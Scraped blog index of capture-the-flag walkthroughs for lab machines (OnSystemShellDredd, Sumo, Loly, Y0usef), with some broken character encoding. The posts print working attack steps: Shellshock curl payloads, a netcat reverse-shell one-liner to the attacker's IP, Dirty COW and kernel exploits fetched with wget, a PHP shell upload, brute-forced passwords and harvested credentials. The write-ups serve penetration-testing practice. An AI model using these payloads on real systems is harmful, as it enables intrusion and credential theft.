[build.sh](http://build.sh/)-rw-r--r--. 1 root root 100 Jan 28 2021 .cshrc-rw------- 1 root root 20 Mar 28 03:22 .lesshst-rwx------. 1 root root 33 Jul 6 03:23 proof.txt-rw-r--r--. 1 root root 4529 Mar 28 03:09 [run.sh](http://run.sh/)drwx------. 2 root root 38 Mar 28 03:18 .ssh-rw-r--r--. 1 root root 129 Jan 28 2021 .tcshrcbash-5.1# cat proof.txt72240fac56d1edb09c402c9d6cd99d0ebash-5.1#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "OnSystemShellDredd", "url": "/posts/OnSystemShellDredd/", "categories": "Proving Grounds, Play", "tags": "FTP, PrivEsc, SUIDs", "date": "2023-06-27 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>```bashIP : 192.168.222.130```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/OnSystemShellDredd/Untitled.png)```bashOPEN PORTS >21 FTP ...", "content": "### Letâ€™s find the IP Address first >>```bashIP : 192.168.222.130```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/OnSystemShellDredd/Untitled.png)```bashOPEN PORTS >21 FTP (Try Anonymous)61000 SSH```{: .nolineno}---## FTP Enumeration â¤µï¸Now Lets try Anonymous Login into the FTP port login â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/OnSystemShellDredd]â””â”€$ ftp 192.168.222.130 21Connected to 192.168.222.130.220 (vsFTPd 3.0.3)Name (192.168.222.130:kali): Anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||53806|)150 Here comes the directory listing.drwxr-xr-x 3 0 115 4096 Aug 06 2020 .drwxr-xr-x 3 0 115 4096 Aug 06 2020 ..drwxr-xr-x 2 0 0 4096 Aug 06 2020 .hannah226 Directory send OK.ftp> cd .hannah250 Directory successfully changed.ftp> ls -al229 Entering Extended Passive Mode (|||53960|)150 Here comes the directory listing.drwxr-xr-x 2 0 0 4096 Aug 06 2020 .drwxr-xr-x 3 0 115 4096 Aug 06 2020 ..-rwxr-xr-x 1 0 0 1823 Aug 06 2020 id_rsa226 Directory send OK.ftp> get id_rsalocal: id_rsa remote: id_rsa229 Entering Extended Passive Mode (|||15635|)150 Opening BINARY mode data connection for id_rsa (1823 bytes).100% |***********************************************************************************| 1823 465.67 KiB/s 00:00 ETA226 Transfer complete.1823 bytes received in 00:02 (0.86 KiB/s)ftp>```{: .nolineno}Now in this FTP session I got a private key ( `id_rsa` ) for ssh login and a username as `hannah` so lets try the ssh on port `61000` â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/monitoring]â””â”€$ ssh hannah@192.168.222.130 -i id_rsa -p 61000 The authenticity of host '[192.168.222.130]:61000 ([192.168.222.130]:61000)' can not be established.ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[192.168.222.130]:61000' (ED25519) to the list of known hosts.Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.hannah@ShellDredd:~$ whoamihannahhannah@ShellDredd:~$ iduid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)hannah@ShellDredd:~$```{: .nolineno}---## SHELL âž¡ï¸Now when I got the shell so easily so lets find some flags first â†’```bashhannah@ShellDredd:~$ cat user.txt Your flag is in another file...hannah@ShellDredd:~$ cat local.txt 25be130d1a9ddcb79ff365b266f21a20hannah@ShellDredd:~$```{: .nolineno}Now lets check the SUIDs files for some permissions that leads me to root â†’```bashhannah@ShellDredd:/$ find / -perm -u=s -type f 2>/dev/null /usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/umount/usr/bin/mawk > LFILE }'hannah@ShellDredd:/$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologinhannah:x:1000:1000:hannah,,,:/home/hannah:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologinshiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bashhannah@ShellDredd:/$```{: .nolineno}Now lets switch user as `shiv` and use password as `password` â†’```bashhannah@ShellDredd:/$ su shivPassword: root@ShellDredd:/# whoamirootroot@ShellDredd:/# iduid=0(root) gid=0(root) groups=0(root)root@ShellDredd:/# cd /rootroot@ShellDredd:~# ls -altotal 28drwx------ 3 root root 4096 Jun 27 12:13 .drwxr-xr-x 18 root root 4096 Aug 6 2020 ..lrwxrwxrwx 1 root root 9 Jan 21 2021 .bash_history -> /dev/null-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw------- 1 root root 33 Jun 27 12:13 proof.txt-rw-r--r-- 1 root root 32 Jan 29 2021 root.txtdrwxr-xr-x 2 root root 4096 Jan 21 2021 .sshroot@ShellDredd:~# cat root.txtYour flag is in another file...root@ShellDredd:~# cat proof.txt db699ce21ad954ed59bd0f2d91062c80root@ShellDredd:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever3: ens192: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:ba:5a:ec brd ff:ff:ff:ff:ff:ff inet 192.168.222.130/24 brd 192.168.222.255 scope global ens192 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feba:5aec/64 scope link valid_lft forever preferred_lft foreverroot@ShellDredd:~#```{: .nolineno}---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Sumo", "url": "/posts/Sumo/", "categories": "Proving Grounds, Play", "tags": "DirtyCow, PrivEsc, ShellShock", "date": "2023-06-26 00:00:00 +0530", "snippet": "## Description â¤µï¸>ðŸ’¡ [Sumo](https://vulnhub.com/entry/sumo-1,480/) âž¡ï¸ - Machine Name: Sumo_Sun* - Author: SunCSR Team - Difficulty: Beginner - Tested: VMware Workstation 15.x Pro ...", "content": "## Description â¤µï¸>ðŸ’¡ [Sumo](https://vulnhub.com/entry/sumo-1,480/) âž¡ï¸ - Machine Name: Sumo_Sun* - Author: SunCSR Team - Difficulty: Beginner - Tested: VMware Workstation 15.x Pro - DHCP: Enabled - Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag (under /root). - Information: Your feedback is appreciated - Email:Â suncsr.challenges@gmail.com - In this machine IP changes while solving it.{: .prompt-info }### Letâ€™s find the IP Address first >>```bashIP : 192.168.233.87```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Sumo]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.233.87 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 12:40 ISTWarning: 192.168.233.87 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.233.87Host is up (0.17s latency).Not shown: 65456 closed tcp ports (reset), 77 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)| 2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)|_ 256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)80/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.2.22 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Sumo/Untitled.png)Now Lets try this shellshock exploit â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Sumo]â””â”€$ curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'\" \\http://192.168.233.87/cgi-bin/test root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemessagebus:x:102:104::/var/run/dbus:/bin/falsesumo:x:1000:1000:sumo,,,:/home/sumo:/bin/bashsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin```{: .nolineno}Now its working so lets try something else â†’So for reverese shell I tried the nc script â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Sumo]â””â”€$ curl -H \"user-agent: () { :;}; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.195 4444 >/tmp/f'\" \\ http://192.168.233.87/cgi-bin/test```{: .nolineno}In response I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Sumo]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.45.195] from (UNKNOWN) [192.168.233.87] 43584/bin/sh: 0: can not access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'/bin/sh: 1: python3: not found$ python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@ubuntu:/usr/lib/cgi-bin$ whoamiwhoamiwww-datawww-data@ubuntu:/usr/lib/cgi-bin$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@ubuntu:/usr/lib/cgi-bin$```{: .nolineno}---## SHELL âž¡ï¸Now Lets dig deeper in Shell â†’```bashwww-data@ubuntu:/usr/lib/cgi-bin$ cat local.txtcat local.txt50e71eeb52701d49e85e7969eb4dd10cwww-data@ubuntu:/usr/lib/cgi-bin$```{: .nolineno}Now I tried different methods to execute the kernel Exploit of `dirtycow` but gcc throws an error each time so lets use another method to breach this machine lets take a help of metasploit as it is more stable and fast â†’lets search the shellshock in metasploit â†’![Untitled](/Vulnhub-Files/img/Sumo/Untitled%201.png)Now lets `use 1` for usage of this exploit â†’![Untitled](/Vulnhub-Files/img/Sumo/Untitled%202.png)Now lets fill these Required YES options â†’`set LHOST 192.168.249.128``set RHOSTS 192.168.249.136``set TARGETURI /cgi-bin/test``set LPORT 4444``run`Set see the response â†’![Untitled](/Vulnhub-Files/img/Sumo/Untitled%203.png)I am inside the shell so lets upload the `dirtycow.c` exploit from attackers machine to victim machine â†’![Untitled](/Vulnhub-Files/img/Sumo/Untitled%204.png)lets upload it now â†’```bashmeterpreter > upload dirtycow.c /tmp[*] Uploading : /home/kali/Downloads/Proving_Ground/Sumo/dirtycow.c -> /tmp/dirtycow.c[*] Completed : /home/kali/Downloads/Proving_Ground/Sumo/dirtycow.c -> /tmp/dirtycow.cmeterpreter > shellProcess 1419 created.Channel 6 created.python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmpcd /tmpwww-data@ubuntu:/tmp$ ls -alls -altotal 32drwxrwxrwt 5 root root 4096 Jun 26 00:54 .drwxr-xr-x 23 root root 4096 May 11 2020 ..-rwxrwxrwx 1 www-data www-data 207 Jun 26 00:48 UeBZwdrwxrwxrwt 2 root root 4096 Jun 26 2023 VMwareDnD-rw-r--r-- 1 www-data www-data 5006 Jun 26 00:54 dirtycow.cdrwx------ 2 root root 4096 Jun 26 2023 vmware-rootdrwx------ 2 root root 4096 Jun 26 2023 vmware-root_1309-4282367544www-data@ubuntu:/tmp$ gcc -pthread dirtycow.c -o shell -lcryptgcc -pthread dirtycow.c -o shell -lcryptwww-data@ubuntu:/tmp$```{: .nolineno}Now lets execute this `shell` compiled code â†’```bashwww-data@ubuntu:/tmp$ ./shell password ./shell password/etc/passwd successfully backed up to /tmp/passwd.bakPlease enter the new password: passwordComplete line:firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bashmmap: 7f48b3c8d000madvise 0ptrace 0Done! Check /etc/passwd to see if the new user was created.You can log in with the username 'firefart' and the password 'password'.DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwdDone! Check /etc/passwd to see if the new user was created.You can log in with the username 'firefart' and the password 'password'.DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwdwww-data@ubuntu:/tmp$```{: .nolineno}Now its time for switching to another user named as firefart â†’```bashwww-data@ubuntu:/tmp$ su firefartsu firefartPassword: passwordfirefart@ubuntu:/tmp# cd /rootcd /rootfirefart@ubuntu:~# ls -alls -altotal 28drwx------ 3 firefart root 4096 May 13 2020 .drwxr-xr-x 23 firefart root 4096 May 11 2020 ..-rw------- 1 firefart root 22 May 13 2020 .bash_history-rw-r--r-- 1 firefart root 3106 Apr 19 2012 .bashrcdrwx------ 2 firefart root 4096 May 11 2020 .cache-rw-r--r-- 1 firefart root 140 Apr 19 2012 .profile-rw-r--r-- 1 firefart root 24 May 11 2020 root.txtfirefart@ubuntu:~# cat root.txtcat root.txt{Sum0-SunCSR-2020_r001}firefart@ubuntu:~# whoamiwhoamifirefartfirefart@ubuntu:~# ididuid=0(firefart) gid=0(root) groups=0(root)firefart@ubuntu:~# ip aip a1: lo: mtu 16436 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:e6:d1:ed brd ff:ff:ff:ff:ff:ff inet 192.168.249.136/24 brd 192.168.249.255 scope global eth0 inet6 fe80::20c:29ff:fee6:d1ed/64 scope link valid_lft forever preferred_lft foreverfirefart@ubuntu:~#```{: .nolineno}---## Summery Notes âž¡ï¸>Only problem was with the machine reverse shell which was not able to execute the gcc commands thats why I used metasploit.{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Loly", "url": "/posts/Loly/", "categories": "Proving Grounds, Play", "tags": "Kernel Exploit, LFI, Wordpress, PrivEsc", "date": "2023-06-22 00:00:00 +0530", "snippet": "Description â¤µï¸ ðŸ’¡ Loly âž¡ï¸ Difficulty: Easy Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox) Goal: Get the root shell i.e.(root@localhost:~#) and...", "content": "Description â¤µï¸ ðŸ’¡ Loly âž¡ï¸ Difficulty: Easy Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox) Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root). Information: Your feedback is appreciated - Email:Â suncsr.challenges@gmail.com Port Scan Results âž¡ï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Loly]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.157.121[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-20 15:51 ISTWarning: 192.168.157.121 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.157.121Host is up (0.17s latency).Not shown: 65488 closed tcp ports (reset), 46 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http nginx 1.10.3 (Ubuntu)|_http-title: Welcome to nginx!|_http-server-header: nginx/1.10.3 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb Enumeration â¤µï¸Now lets set the /etc/hosts file as loly.lc â†’Now with directory or files bruteforcing I got wordpress on this machine â†’Now lets look into it â†’Now with WPSCAN Tool I got username as Loly and when I bruteforced to find the password then I got this â†’wpscan --url http://loly.lc/wordpress/ -U Loly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txtUsername: LolyPassword: fernandoNow lets login â†’Now in AdRotate column I have the option to upload the banners so lets try to upload our payload for reverse shell â†’I was struggling to upload the php file so I seen the .zip extension so I zipped the shell.php file into shell.zip file and uploaded it then I loaded this URL â†’http://loly.lc/wordpress/wp-content/banners/shell.phpSHELL âž¡ï¸Now lets dig deeper into this local privileged shell â†’www-data@ubuntu:~$ cat local.txtcat local.txt1202a2f217f0453838ce4169bbd4dd79www-data@ubuntu:~$Now lets see the wp-config.php file which contains credentials â†’www-data@ubuntu:~/html/wordpress$ cat wp-config\tcat wp-config.php &lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You do not have to use the web site, you can * copy this file to \"wp-config.php\" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wordpress' );/** MySQL database username */define( 'DB_USER', 'wordpress' );/** MySQL database password */define( 'DB_PASSWORD', 'lolyisabeautifulgirl' ); &lt;-- PASSWORD /** MySQL hostname */define( 'DB_HOST', 'localhost' );/** Database Charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8' );/** The Database Collate type. Do not change this if in doubt. */define( 'DB_COLLATE', '' );/**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */define( 'AUTH_KEY', 'put your unique phrase here' );define( 'SECURE_AUTH_KEY', 'put your unique phrase here' );define( 'LOGGED_IN_KEY', 'put your unique phrase here' );define( 'NONCE_KEY', 'put your unique phrase here' );define( 'AUTH_SALT', 'put your unique phrase here' );define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );define( 'LOGGED_IN_SALT', 'put your unique phrase here' );define( 'NONCE_SALT', 'put your unique phrase here' );/**#@-*//** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */$table_prefix = 'wp_';/** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the documentation. * * @link https://wordpress.org/support/article/debugging-in-wordpress/ */define( 'WP_DEBUG', false );define( 'DISALLOW_FILE_EDIT', true );define( 'DISALLOW_FILE_MODS', true );define('FS_METHOD','direct');/* That is all, stop editing! Happy publishing. *//** Absolute path to the WordPress directory. */if ( ! defined( 'ABSPATH' ) ) {\tdefine( 'ABSPATH', __DIR__ . '/' );}/** Sets up WordPress vars and included files. */require_once ABSPATH . 'wp-settings.php';www-data@ubuntu:~/html/wordpress$Now lets use that password to try to change the user in this machine â†’www-data@ubuntu:~/html/wordpress$ su lolysu lolyPassword: lolyisabeautifulgirlloly@ubuntu:/var/www/html/wordpress$ whoamiwhoamilolyloly@ubuntu:/var/www/html/wordpress$ cd ~cd ~loly@ubuntu:~$ ididuid=1000(loly) gid=1000(loly) groups=1000(loly),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)loly@ubuntu:~$Now I tied different methods to get to root but no luck so far so lets try kernel exploitation â†’loly@ubuntu:/tmp$ uname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linuxloly@ubuntu:/tmp$Lets try it out now â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Loly]â””â”€$ searchsploit -m linux/local/45010.c Exploit: Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation URL: https://www.exploit-db.com/exploits/45010 Path: /usr/share/exploitdb/exploits/linux/local/45010.c Codes: CVE-2017-16995 Verified: TrueFile Type: C source, ASCII textCopied to: /home/kali/Downloads/Proving_Ground//Vulnhub-Files/img/Loly/45010.cLets transfer it to victim machine through python3 http server and recive it with wget â†’loly@ubuntu:/tmp$ wget http://192.168.45.200:8888/45010.c--2023-06-22 03:51:55-- http://192.168.45.200:8888/45010.cConnecting to 192.168.45.200:8888... connected.HTTP request sent, awaiting response... 200 OKLength: 13176 (13K) [text/x-csrc]Saving to: â€˜45010.câ€™45010.c 100%[===================&gt;] 12.87K --.-KB/s in 0.002s 2023-06-22 03:51:56 (5.51 MB/s) - â€˜45010.câ€™ saved [13176/13176]loly@ubuntu:/tmp$ chmod +x 45010.cNow lets run this exploit â†’loly@ubuntu:/tmp$ chmod +x 45010.cloly@ubuntu:/tmp$ gcc 45010.c -o rootloly@ubuntu:/tmp$ ./root[.] [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)[.] [.] ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **[.] [*] creating bpf map[*] sneaking evil bpf past the verifier[*] creating socketpair()[*] attaching bpf backdoor to socket[*] skbuff =&gt; ffff8800768d0d00[*] Leaking sock struct from ffff88007718c780[*] Sock-&gt;sk_rcvtimeo at offset 472[*] Cred structure at ffff88007ac89540[*] UID from cred structure: 1000, matches the current: 1000[*] hammering cred structure at ffff88007ac89540[*] credentials patched, launching shell...# /bin/bash -iroot@ubuntu:/tmp# cd ~root@ubuntu:~#Now to the /root/ directory â†’root@ubuntu:~# cd /rootroot@ubuntu:/root# ls -altotal 32drwx------ 3 root root 4096 Jun 22 02:54 .drwxr-xr-x 22 root root 4096 Dec 7 2020 ..-rw------- 1 root root 0 Jan 13 2021 .bash_history-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwx------ 2 root root 4096 Jan 12 2021 .cache-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw------- 1 root root 33 Jun 22 02:54 proof.txt-rw-r--r-- 1 root root 32 Dec 7 2020 root.txt-rw-r--r-- 1 root root 75 Aug 20 2020 .selected_editorroot@ubuntu:/root# cat root.txtYour flag is in another file...root@ubuntu:/root# cat proof.txt 8ec102ee173b0d41d6a9beaba221a308root@ubuntu:/root# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever3: ens224: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:ba:70:cf brd ff:ff:ff:ff:ff:ff inet 192.168.233.121/24 brd 192.168.233.255 scope global ens224 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feba:70cf/64 scope link valid_lft forever preferred_lft foreverroot@ubuntu:/root# whoamirootroot@ubuntu:/root# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)root@ubuntu:/root# If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "Y0usef", "url": "/posts/Y0usef/", "categories": "Proving Grounds, Play", "tags": "X-Forwarded-For, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the Victim Machine IP Address â¤µï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled.png)```{: .nolineno} IP : 10.0.2.39```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/im...", "content": "### Lets check the Victim Machine IP Address â¤µï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled.png)```{: .nolineno} IP : 10.0.2.39```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/y0usef]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.39Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:41 ISTNmap scan report for 10.0.2.39Host is up (0.00054s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 d8e0998c76f186a3ce09c819a41dc7e1 (DSA)| 2048 82b020bc04ea3fc2cf73c3d4fab54b47 (RSA)| 256 034db0704dcf5a4a87c3a5ee84ccaacc (ECDSA)|_ 256 64cdd0af6e0d201301963b8d163ad61b (ED25519)80/tcp open http Apache httpd 2.4.10 ((Ubuntu))|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.4.10 (Ubuntu)MAC Address: 08:00:27:9F:07:8D (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%202.png)Now with Directory Listing I got a directory named as `/administrator/` with 301 status .![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%204.png)Now with burpsuite I see no redirect sites so lets add one [localhost](https://localhost) as redirect â¤µï¸`X-Forwarded-For: localhost`![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%205.png)Now lets forward this request âž¡ï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%206.png)Now I tried `admin : admin` and I got in âž¡ï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%207.png)Now letâ€™s upload our reverse shell file â¬‡ï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%208.png)Now lets load the url â¬‡ï¸> [https://10.0.2.39/adminstration/upload/files/1682664347shell.php](https://10.0.2.39/adminstration/upload/files/1682664347shell.php)> ![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%209.png)```bashwww-data@yousef-VirtualBox:/home$ cat user.txtcat user.txtc3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=www-data@yousef-VirtualBox:/home$Attackers Machine >>â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/y0usef]â””â”€$ echo \"c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=\" | base64 -dssh : user : yousef pass : yousef123```{: .nolineno}Lets see yousef user is capable of â¤µï¸![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%2010.png)![Untitled](/Vulnhub-Files/img/Y0usef/Untitled%2011.png)```bashroot@yousef-VirtualBox:/root# cat root.txtcat 